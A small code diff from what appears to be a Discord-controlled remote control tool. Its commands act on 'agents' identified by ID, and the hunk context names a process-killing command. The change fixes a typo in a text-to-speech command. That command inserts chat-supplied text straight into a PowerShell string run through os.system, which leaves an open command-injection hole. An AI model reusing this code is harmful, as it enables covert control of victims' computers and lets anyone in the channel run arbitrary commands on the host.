@@ -541,7 +541,7 @@ async def killproc(context):
 
 @client.command(name='tts', pass_context=True)
 async def tts(context):
-    command = context.mnessage.content.replace("!tts ", "")
+    command = context.message.content.replace("!tts ", "")
     try:
         os.system(f'''PowerShell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{command}');"''')
         my_embed = discord.Embed(title="Successfully sent the text-to-speech command on Agent#{ID}", color=0x00FF00)
